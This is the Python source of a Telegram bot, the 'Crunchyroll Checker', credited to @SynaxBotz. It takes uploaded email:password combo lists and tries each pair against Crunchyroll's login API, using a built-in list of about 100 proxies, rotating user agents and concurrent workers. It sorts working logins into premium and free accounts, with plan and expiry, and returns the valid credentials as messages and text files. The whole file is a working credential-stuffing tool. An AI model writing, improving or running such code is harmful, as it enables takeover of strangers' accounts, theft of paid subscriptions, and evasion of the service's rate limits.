import asyncio
import aiohttp
import random
import io
import datetime
import os
import logging
import json
from datetime import datetime as dt
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import TelegramError, BadRequest, Forbidden, NetworkError

logging.basicConfig(
    format="%(asctime)s | %(levelname)s | %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("BOT_TOKEN environment variable is not set.")

THREADS = 8

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

active_checkers: dict[int, "CrunchyChecker"] = {}

BUILTIN_PROXIES = """13.36.243.194:9899
165.225.113.220:11462
165.225.113.220:11233
15.188.75.223:3128
165.225.113.220:10679
165.225.113.220:10958
132.226.163.224:2053
13.230.49.39:8080
134.209.188.167:443
139.59.5.27:443
3.99.169.21:8888
40.177.151.5:42099
3.110.127.255:6571
15.168.235.57:37140
52.66.191.112:7274
40.192.18.48:34352
52.199.97.69:49250
34.236.148.220:49419
35.180.127.14:1001
13.233.195.7:29541
18.100.254.193:26507
15.168.235.57:13270
52.199.97.69:18610
18.201.114.187:9090
18.100.254.193:37762
3.99.169.21:14887
52.67.14.48:54558
3.99.169.21:46334
15.168.235.57:8600
18.100.254.193:43940
52.66.191.112:44036
43.198.99.209:9088
43.208.16.199:766
18.100.126.55:57555
43.198.99.209:21820
52.78.193.98:8246
18.100.127.123:9323
43.208.16.199:30756
18.201.114.187:10879
52.78.193.98:4161
43.198.99.209:166
163.172.221.209:443
185.33.239.224:8080
89.109.7.67:443
51.77.200.90:80
161.97.162.118:80
88.198.212.91:3128
89.43.31.134:3128
74.82.50.155:3128
177.68.149.122:8080
146.190.232.76:3128
45.227.195.121:8082
190.60.57.42:3128
216.250.11.178:3128
175.138.75.137:8080
177.190.218.145:9999
45.88.0.117:3128
38.180.2.107:3128
185.162.94.28:8080
162.240.154.26:3128
209.14.113.2:999
172.67.70.35:80
186.33.40.17:999
40.89.145.14:80
1.231.81.166:3128
196.204.138.244:1976
133.242.138.34:8100
4.213.167.178:80
45.88.0.111:3128
142.93.202.130:3128
47.89.184.18:3128
74.176.195.135:80
139.59.103.183:80
47.91.65.23:3128
45.88.0.115:3128
82.210.56.251:80
4.213.98.253:80
191.102.123.196:999
52.229.30.3:80
185.191.236.162:3128
18.133.120.146:3128
23.236.144.90:3128
45.230.169.129:999
49.156.44.114:8080
8.140.104.98:3128
103.42.203.161:8090
91.238.105.64:2024
206.81.27.105:3128
103.231.236.235:8182
43.135.159.230:9562
43.130.35.101:19504
136.228.234.29:8009
136.228.234.4:8009
27.74.247.173:8080
104.248.25.131:3128
201.77.110.33:999
173.212.222.244:8888"""


def load_builtin_proxies():
    proxies = []
    for line in BUILTIN_PROXIES.strip().splitlines():
        line = line.strip()
        if line:
            proxies.append(line)
    random.shuffle(proxies)
    return proxies


class CrunchyChecker:
    def __init__(self, combos, proxies=None):
        self.combos = list(combos)
        self.proxies = proxies if proxies else []
        self.proxy_index = 0
        self.proxy_lock = asyncio.Lock()

        self.hits = []
        self.free = []
        self.bad = 0
        self.errors = 0
        self.checked = 0
        self.total = len(combos)
        self.cpm = 0
        self.start_time = 0
        self.cancelled = False
        self.lock = asyncio.Lock()

    async def get_next_proxy(self):
        if not self.proxies:
            return None
        async with self.proxy_lock:
            proxy = self.proxies[self.proxy_index % len(self.proxies)]
            self.proxy_index += 1
            return f"http://{proxy}"

    async def check_account(self, email, password):
        """
        Working approach using old Crunchyroll session API:
        1. GET /login to get session_id cookie
        2. POST to api.crunchyroll.com/login.0.json with credentials + session_id
        3. Parse the response
        """
        proxy_url = await self.get_next_proxy()
        proxies_to_try = [proxy_url, None] if proxy_url else [None]

        for proxy in proxies_to_try:
            result = await self._attempt_check(email, password, proxy)
            if result['status'] != 'error':
                return result

        return {'status': 'error', 'email': email}

    async def _attempt_check(self, email, password, proxy_url):
        connector = aiohttp.TCPConnector(ssl=False, limit=0)
        jar = aiohttp.CookieJar(unsafe=True)
        timeout = aiohttp.ClientTimeout(total=25, connect=10)
        ua = random.choice(USER_AGENTS)

        try:
            async with aiohttp.ClientSession(
                connector=connector,
                cookie_jar=jar,
                timeout=timeout
            ) as session:

                # Step 1: Get session cookie from Crunchyroll login page
                try:
                    async with session.get(
                        'https://www.crunchyroll.com/login',
                        headers={'User-Agent': ua},
                        proxy=proxy_url
                    ) as r:
                        if r.status != 200:
                            return {'status': 'error', 'email': email}
                except Exception:
                    return {'status': 'error', 'email': email}

                cookies = {c.key: c.value for c in jar}
                session_id = cookies.get('session_id', '')
                if not session_id:
                    return {'status': 'error', 'email': email}

                # Step 2: Login via Crunchyroll API using session_id
                login_data = {
                    'account': email,
                    'password': password,
                    'session_id': session_id,
                    'locale': 'enUS',
                }
                login_headers = {
                    'User-Agent': ua,
                    'Content-Type': 'application/x-www-form-urlencoded',
                }

                try:
                    async with session.post(
                        'https://api.crunchyroll.com/login.0.json',
                        data=login_data,
                        headers=login_headers,
                        proxy=proxy_url
                    ) as r:
                        if r.status != 200:
                            return {'status': 'error', 'email': email}
                        resp = await r.json(content_type=None)
                except Exception:
                    return {'status': 'error', 'email': email}

                # Step 3: Parse login response
                if resp.get('error', True):
                    code = resp.get('code', '')
                    # bad_session = wrong credentials, other codes = API errors
                    if code in ('bad_session', 'bad_auth_params', 'invalid_credentials', 'login_failed'):
                        return {'status': 'bad', 'email': email}
                    # Unexpected error code â€” treat as bad credentials
                    return {'status': 'bad', 'email': email}

                # Login succeeded â€” check subscription
                user_data = resp.get('data', {}).get('user', {})
                premium = user_data.get('premium', '')
                access_type = user_data.get('access_type', None)
                email_verified = user_data.get('email_verified', False)
                created = user_data.get('created', '')

                # No subscription
                if not premium and not access_type:
                    return {
                        'status': 'free',
                        'email': email,
                        'password': password,
                        'created': created,
                        'verified': email_verified,
                    }

                # Has subscription â€” determine plan type
                if access_type:
                    plan_type = access_type.upper()
                elif premium:
                    plan_type = premium.upper()
                else:
                    plan_type = 'PREMIUM'

                # Try to get expiry date from queue_info endpoint
                expiry_date = 'Unknown'
                remaining_days = '?'
                try:
                    cookies2 = {c.key: c.value for c in jar}
                    cookie_str = '; '.join([f'{k}={v}' for k, v in cookies2.items()])
                    info_headers = {
                        'User-Agent': ua,
                        'Cookie': cookie_str,
                    }
                    info_data = {'session_id': cookies2.get('session_id', session_id)}
                    async with session.post(
                        'https://api.crunchyroll.com/info.0.json',
                        data=info_data,
                        headers=info_headers,
                        proxy=proxy_url
                    ) as r2:
                        if r2.status == 200:
                            info = await r2.json(content_type=None)
                            exp = info.get('data', {}).get('user', {}).get('expires', '')
                            if exp:
                                try:
                                    exp_dt = dt.fromisoformat(exp.replace('Z', '+00:00'))
                                    expiry_date = exp_dt.strftime('%Y-%m-%d')
                                    remaining_days = (exp_dt.replace(tzinfo=None) - dt.now()).days
                                    if remaining_days < 0:
                                        return {'status': 'expired', 'email': email, 'password': password}
                                except Exception:
                                    pass
                except Exception:
                    pass

                return {
                    'status': 'hit',
                    'email': email,
                    'password': password,
                    'plan': plan_type,
                    'expiry': expiry_date,
                    'days': remaining_days,
                    'verified': email_verified,
                }

        except asyncio.TimeoutError:
            return {'status': 'error', 'email': email}
        except Exception as e:
            logger.debug(f"check error for {email}: {e}")
            return {'status': 'error', 'email': email}

    async def worker(self, context, chat_id, message_id):
        while not self.cancelled:
            async with self.lock:
                if not self.combos:
                    break
                combo = self.combos.pop(0)

            parts = combo.split(':', 1)
            if len(parts) != 2:
                async with self.lock:
                    self.bad += 1
                    self.checked += 1
                continue

            email, password = parts[0].strip(), parts[1].strip()
            if not email or not password:
                async with self.lock:
                    self.bad += 1
                    self.checked += 1
                continue

            result = await self.check_account(email, password)

            async with self.lock:
                self.checked += 1
                status = result['status']

                if status == 'hit':
                    self.hits.append(result)
                    try:
                        hit_text = (
                            f"âœ… *HIT FOUND*\n\n"
                            f"ðŸ“§ `{result['email']}:{result['password']}`\n"
                            f"ðŸ’Ž Plan: `{result['plan']}`\n"
                            f"ðŸ“… Expiry: `{result['expiry']}`\n"
                            f"â³ Days Left: `{result['days']}`\n"
                            f"âœ”ï¸ Verified: `{result.get('verified', '?')}`"
                        )
                        await context.bot.send_message(
                            chat_id=chat_id, text=hit_text, parse_mode='Markdown'
                        )
                    except TelegramError:
                        pass

                elif status == 'free':
                    self.free.append(result)
                    try:
                        free_text = (
                            f"ðŸ†“ *FREE ACCOUNT*\n\n"
                            f"ðŸ“§ `{result['email']}:{result['password']}`"
                        )
                        await context.bot.send_message(
                            chat_id=chat_id, text=free_text, parse_mode='Markdown'
                        )
                    except TelegramError:
                        pass

                elif status == 'expired':
                    self.bad += 1

                else:
                    self.bad += 1

    async def run(self, context: ContextTypes.DEFAULT_TYPE, chat_id, message_id):
        self.start_time = datetime.datetime.now().timestamp()

        tasks = [
            asyncio.create_task(self.worker(context, chat_id, message_id))
            for _ in range(min(THREADS, self.total))
        ]

        while not all(t.done() for t in tasks):
            await asyncio.sleep(4)
            if self.cancelled:
                for t in tasks:
                    t.cancel()
                break

            elapsed = datetime.datetime.now().timestamp() - self.start_time
            if elapsed > 0:
                self.cpm = int((self.checked / elapsed) * 60)

            cancel_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ›‘ Cancel Check", callback_data="cancel_check")]
            ])
            text = (
                f"âš¡ *CRUNCHYROLL CHECKER*\n\n"
                f"{self._progress_bar()}\n"
                f"ðŸ“Š *Progress:* `{self.checked}/{self.total}`\n"
                f"âš¡ *CPM:* `{self.cpm}`\n\n"
                f"âœ… *Hits:* `{len(self.hits)}`\n"
                f"ðŸ†“ *Free:* `{len(self.free)}`\n"
                f"âŒ *Bad:* `{self.bad}`"
            )
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id, message_id=message_id,
                    text=text, parse_mode='Markdown', reply_markup=cancel_kb
                )
            except (BadRequest, TelegramError):
                pass

        await asyncio.gather(*tasks, return_exceptions=True)
        active_checkers.pop(chat_id, None)

        elapsed = datetime.datetime.now().timestamp() - self.start_time
        final_cpm = int((self.checked / elapsed) * 60) if elapsed > 0 else 0

        if self.cancelled:
            text = (
                f"ðŸ›‘ *CHECK CANCELLED*\n\n"
                f"ðŸ“Š Checked: `{self.checked}/{self.total}`\n"
                f"âœ… Hits: `{len(self.hits)}`\n"
                f"ðŸ†“ Free: `{len(self.free)}`\n"
                f"âŒ Bad: `{self.bad}`"
            )
        else:
            text = (
                f"ðŸ *CHECK COMPLETE*\n\n"
                f"âœ… *Hits:* `{len(self.hits)}`\n"
                f"ðŸ†“ *Free:* `{len(self.free)}`\n"
                f"âŒ *Bad:* `{self.bad}`\n"
                f"âš¡ *Avg CPM:* `{final_cpm}`"
            )

        again_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("ðŸ”„ Check Again", callback_data="check_again"),
             InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
        ])

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text=text, parse_mode='Markdown', reply_markup=again_kb
            )
        except TelegramError:
            pass

        if self.hits:
            output = ""
            for h in self.hits:
                output += (
                    f"Email: {h['email']}\n"
                    f"Pass: {h['password']}\n"
                    f"Plan: {h['plan']} | Expiry: {h['expiry']} | Days: {h['days']}\n"
                    f"{'=' * 40}\n"
                )
            bio = io.BytesIO(output.encode('utf-8'))
            bio.name = "hits.txt"
            try:
                await context.bot.send_document(
                    chat_id=chat_id, document=bio,
                    caption=f"âœ… *{len(self.hits)} hits found!*",
                    parse_mode='Markdown'
                )
            except TelegramError:
                pass

        if self.free:
            output = "\n".join(f"{f['email']}:{f['password']}" for f in self.free)
            bio = io.BytesIO(output.encode('utf-8'))
            bio.name = "free.txt"
            try:
                await context.bot.send_document(
                    chat_id=chat_id, document=bio,
                    caption=f"ðŸ†“ *{len(self.free)} free accounts found!*",
                    parse_mode='Markdown'
                )
            except TelegramError:
                pass

    def _progress_bar(self):
        if self.total == 0:
            return "â–±â–±â–±â–±â–±â–±â–±â–±â–±â–± 0%"
        pct = int((self.checked / self.total) * 10)
        bar = "â–°" * pct + "â–±" * (10 - pct)
        return f"{bar} {int((self.checked / self.total) * 100)}%"


def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("ðŸ” Check Accounts", callback_data="check_accounts")],
        [InlineKeyboardButton("â„¹ï¸ How to Use", callback_data="how_to_use"),
         InlineKeyboardButton("ðŸ“Š Bot Info", callback_data="bot_info")],
        [InlineKeyboardButton("ðŸ‘¨â€ðŸ’» Developer", url="https://t.me/SynaxBotz")]
    ])

WELCOME_TEXT = (
    "ðŸŽŒ *CRUNCHYROLL CHECKER BOT*\n"
    "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
    "Welcome! This bot checks Crunchyroll accounts\n"
    "from your combo list automatically.\n\n"
    "ðŸ”Œ *Proxies:* Auto-loaded âœ…\n"
    f"âš¡ *Threads:* {THREADS} concurrent\n"
    "ðŸŽ¯ *Detects:* Premium, Mega Fan, Fan, Free\n\n"
    "Press *Check Accounts* to get started!"
)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        WELCOME_TEXT, parse_mode='Markdown',
        reply_markup=main_menu_keyboard()
    )


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    checker = active_checkers.get(chat_id)
    if checker:
        checker.cancelled = True
        await update.message.reply_text("ðŸ›‘ Cancelling the current check...")
    else:
        await update.message.reply_text(
            "âš ï¸ No active check to cancel.",
            reply_markup=main_menu_keyboard()
        )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "ðŸ“– *HOW TO USE*\n"
        "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
        "1ï¸âƒ£ Press *Check Accounts* from the menu\n"
        "2ï¸âƒ£ Upload a `.txt` combo file\n"
        "   Format: `email:password` (one per line)\n"
        "3ï¸âƒ£ Bot checks automatically with proxies\n"
        "4ï¸âƒ£ Hits & free accounts sent instantly\n"
        "5ï¸âƒ£ Results files sent when done\n\n"
        "*Commands:*\n"
        "/start â€” Main menu\n"
        "/cancel â€” Stop active check\n"
        "/help â€” Show this message"
    )
    await update.message.reply_text(
        text, parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
        ])
    )


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    data = query.data

    if data == "main_menu":
        try:
            await query.edit_message_text(
                WELCOME_TEXT, parse_mode='Markdown',
                reply_markup=main_menu_keyboard()
            )
        except BadRequest:
            pass

    elif data == "check_accounts":
        checker = active_checkers.get(chat_id)
        if checker and not checker.cancelled:
            await query.edit_message_text(
                "âš ï¸ *A check is already running!*\n\nWait for it to finish or use /cancel.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("ðŸ›‘ Cancel Check", callback_data="cancel_check")],
                    [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
                ])
            )
            return
        context.user_data['waiting_for_combo'] = True
        await query.edit_message_text(
            "ðŸ“‚ *Send your combo file*\n\n"
            "Upload a `.txt` file with one `email:password` per line.\n\n"
            "_Example:_\n`user@email.com:password123`",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("âŒ Cancel", callback_data="main_menu")]
            ])
        )

    elif data == "cancel_check":
        checker = active_checkers.get(chat_id)
        if checker:
            checker.cancelled = True
            await query.answer("ðŸ›‘ Cancelling...", show_alert=False)
        else:
            await query.answer("No active check found.", show_alert=True)

    elif data == "check_again":
        context.user_data['waiting_for_combo'] = True
        try:
            await query.edit_message_text(
                "ðŸ“‚ *Send your combo file*\n\n"
                "Upload a `.txt` file with one `email:password` per line.",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("âŒ Cancel", callback_data="main_menu")]
                ])
            )
        except BadRequest:
            pass

    elif data == "how_to_use":
        text = (
            "ðŸ“– *HOW TO USE*\n"
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
            "1ï¸âƒ£ Press *Check Accounts* from the menu\n"
            "2ï¸âƒ£ Upload a `.txt` combo file\n"
            "   Format: `email:password` (one per line)\n"
            "3ï¸âƒ£ Bot checks automatically with proxies\n"
            "4ï¸âƒ£ Hits & free accounts sent instantly\n"
            "5ï¸âƒ£ Results files sent when done\n\n"
            "*Commands:*\n"
            "/start â€” Main menu\n"
            "/cancel â€” Stop active check\n"
            "/help â€” Show this message"
        )
        await query.edit_message_text(
            text, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
            ])
        )

    elif data == "bot_info":
        proxies = load_builtin_proxies()
        text = (
            "ðŸ“Š *BOT INFO*\n"
            "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”\n\n"
            f"ðŸ”Œ *Built-in Proxies:* `{len(proxies)}`\n"
            f"âš¡ *Threads:* `{THREADS}`\n"
            "ðŸŽ¯ *Target:* Crunchyroll\n"
            "ðŸ¤– *Bot:* @SynaxBotz Checker\n\n"
            "ðŸŸ¢ Bot is online and ready!"
        )
        await query.edit_message_text(
            text, parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
            ])
        )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id

    if not context.user_data.get('waiting_for_combo'):
        await update.message.reply_text(
            "âš ï¸ Please press *Check Accounts* from the menu first.",
            parse_mode='Markdown',
            reply_markup=main_menu_keyboard()
        )
        return

    doc = update.message.document
    if not doc:
        return

    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text(
            "âŒ *Wrong file type!*\n\nPlease send a `.txt` file.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
            ])
        )
        return

    context.user_data['waiting_for_combo'] = False
    status_msg = await update.message.reply_text("ðŸ“¥ *Downloading file...*", parse_mode='Markdown')

    try:
        file = await doc.get_file()
        file_path = f"combo_{chat_id}.txt"
        await file.download_to_drive(file_path)
    except TelegramError as e:
        logger.error(f"File download failed: {e}")
        await status_msg.edit_text(
            "âŒ *Failed to download file.*\n\nPlease try again.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
            ])
        )
        return

    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            combos = [line.strip() for line in f if ':' in line.strip()]
    except Exception as e:
        logger.error(f"Error reading combo file: {e}")
        await status_msg.edit_text(
            "âŒ *Could not read the file.*\n\nMake sure it's a valid text file.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
            ])
        )
        return

    if not combos:
        await status_msg.edit_text(
            "âŒ *No valid combos found!*\n\nFile must use `email:password` format.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("ðŸ”„ Try Again", callback_data="check_accounts")],
                [InlineKeyboardButton("ðŸ  Main Menu", callback_data="main_menu")]
            ])
        )
        return

    proxies = load_builtin_proxies()

    await status_msg.edit_text(
        f"âš¡ *CRUNCHYROLL CHECKER*\n\n"
        f"â–±â–±â–±â–±â–±â–±â–±â–±â–±â–± 0%\n"
        f"ðŸ“Š *Progress:* `0/{len(combos)}`\n"
        f"âš¡ *CPM:* `0`\n\n"
        f"âœ… *Hits:* `0`\n"
        f"ðŸ†“ *Free:* `0`\n"
        f"âŒ *Bad:* `0`",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("ðŸ›‘ Cancel Check", callback_data="cancel_check")]
        ])
    )

    checker = CrunchyChecker(combos, proxies)
    active_checkers[chat_id] = checker
    asyncio.create_task(checker.run(context, chat_id, status_msg.message_id))


async def handle_unknown_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('waiting_for_combo'):
        await update.message.reply_text(
            "ðŸ“‚ *Please send a `.txt` file*, not a text message.",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "ðŸ‘‹ Use the menu below to get started!",
            reply_markup=main_menu_keyboard()
        )


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    logger.error(f"Unhandled error: {error}", exc_info=True)

    if isinstance(error, Forbidden):
        logger.warning("Bot blocked by user.")
        return
    if isinstance(error, NetworkError):
        logger.warning(f"Network error: {error}")
        return
    if isinstance(error, BadRequest):
        logger.warning(f"Bad request: {error}")
        return

    if update and hasattr(update, 'effective_chat') and update.effective_chat:
        try:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="âš ï¸ *An unexpected error occurred.*\n\nPlease try again or use /start to reset.",
                parse_mode='Markdown',
                reply_markup=main_menu_keyboard()
            )
        except TelegramError:
            pass


def main():
    logger.info("ðŸš€ Crunchyroll Checker Bot is starting...")
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_unknown_message))
    application.add_error_handler(error_handler)

    logger.info("âœ… Bot is running! Send /start in Telegram.")
    application.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
